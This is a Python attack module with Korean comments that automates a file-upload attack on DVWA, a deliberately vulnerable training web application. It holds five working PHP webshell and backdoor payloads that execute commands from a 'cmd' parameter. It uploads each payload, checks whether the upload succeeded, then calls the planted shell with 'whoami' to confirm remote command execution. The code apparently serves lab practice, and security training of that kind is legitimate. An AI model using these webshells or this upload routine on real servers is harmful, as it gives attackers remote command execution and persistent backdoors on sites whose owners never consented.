"""
File Upload Attack Module
DVWA 파일 업로드 공격 모듈
"""

import time
import os
from utils.logger import log_attack

# 악성 파일 내용 (웹셸)
WEBSHELL_PAYLOADS = {
    'simple_shell.php': """<?php
// Simple PHP Webshell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>""",

    'info.php': """<?php
phpinfo();
?>""",

    'backdoor.php': """<?php
// PHP Backdoor
$output = shell_exec($_GET['cmd']);
echo "<pre>$output</pre>";
?>""",

    'shell.phtml': """<?php system($_GET['cmd']); ?>""",

    'shell.php5': """<?php passthru($_GET['cmd']); ?>""",
}

def run_attack(session, delay=1):
    """
    File Upload 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    upload_url = f"{session.base_url}/vulnerabilities/upload/"

    # 임시 디렉토리 생성
    os.makedirs('payloads', exist_ok=True)

    for filename, content in WEBSHELL_PAYLOADS.items():
        results['attempts'] += 1

        try:
            # 임시 파일 생성
            filepath = os.path.join('payloads', filename)
            with open(filepath, 'w') as f:
                f.write(content)

            # 파일 업로드 시도
            with open(filepath, 'rb') as f:
                files = {'uploaded': (filename, f, 'application/x-php')}
                data = {'Upload': 'Upload'}

                response = session.session.post(upload_url, files=files, data=data)

            # 업로드 성공 여부 확인
            if is_upload_successful(response.text, filename):
                results['successful'] += 1
                results['success'] = True

                # 업로드된 파일 경로 추정
                uploaded_path = f"../../hackable/uploads/{filename}"

                results['findings'].append({
                    'filename': filename,
                    'uploaded_path': uploaded_path,
                    'status_code': response.status_code
                })

                log_attack(
                    'FILE_UPLOAD',
                    'SUCCESS',
                    f"Filename: {filename}, Path: {uploaded_path}",
                    response.status_code,
                    len(response.text)
                )
                print(f"  [+] 업로드 성공: {filename}")

                # 업로드된 웹셸 접근 테스트
                test_webshell_access(session, filename)

            else:
                log_attack(
                    'FILE_UPLOAD',
                    'FAILED',
                    f"Filename: {filename}",
                    response.status_code,
                    len(response.text)
                )

            time.sleep(delay)

        except Exception as e:
            log_attack(
                'FILE_UPLOAD',
                'ERROR',
                f"Filename: {filename}, Error: {str(e)}",
                0,
                0
            )
            print(f"  [-] 오류 발생: {filename} - {str(e)}")

        finally:
            # 임시 파일 삭제
            if os.path.exists(filepath):
                os.remove(filepath)

    print(f"\n[*] File Upload 공격 완료: {results['successful']}/{results['attempts']} 성공\n")
    return results

def is_upload_successful(response_text, filename):
    """
    파일 업로드 성공 여부 판단

    Args:
        response_text: HTTP 응답 본문
        filename: 업로드한 파일명

    Returns:
        bool: 성공 여부
    """
    success_patterns = [
        'succesfully uploaded',
        f'../../hackable/uploads/{filename}',
        'uploaded successfully',
    ]

    for pattern in success_patterns:
        if pattern.lower() in response_text.lower():
            return True

    return False

def test_webshell_access(session, filename):
    """
    업로드된 웹셸에 접근 테스트

    Args:
        session: DVWA 세션 객체
        filename: 업로드된 파일명
    """
    try:
        webshell_url = f"{session.base_url}/hackable/uploads/{filename}"
        test_params = {'cmd': 'whoami'}

        response = session.session.get(webshell_url, params=test_params)

        if response.status_code == 200:
            print(f"    [+] 웹셸 접근 성공: {webshell_url}")
            log_attack(
                'WEBSHELL_ACCESS',
                'SUCCESS',
                f"URL: {webshell_url}",
                response.status_code,
                len(response.text)
            )
        else:
            print(f"    [-] 웹셸 접근 실패: HTTP {response.status_code}")

    except Exception as e:
        print(f"    [-] 웹셸 접근 테스트 오류: {str(e)}")
